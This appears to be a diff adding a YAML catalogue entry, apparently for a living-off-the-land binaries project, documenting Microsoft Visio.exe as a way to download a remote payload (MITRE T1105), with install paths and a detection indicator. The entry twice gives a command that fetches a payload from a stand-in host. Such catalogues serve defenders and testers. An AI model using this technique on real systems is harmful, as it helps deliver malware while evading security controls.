@@ -1,0 +1,33 @@
+---
+Name: Visio.exe
+Description: Microsoft Visio Executable
+Author: Avihay Eldad
+Created: 2024-02-15
+Commands:
+  - Command: Visio.exe https://example.com/payload
+    Description: Downloads payload from remote server using Microsoft Office binary
+    Usecase: It will download a remote payload and place it in the cache folder
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office14\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office15\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office16\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office14\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office15\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office16\Visio.exe
+Code_Sample:
+  - Code: Visio.exe https://example.com/payload
+Detection:
+  - IOC: Suspicious Office application internet/network traffic
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@AvihayEldad'
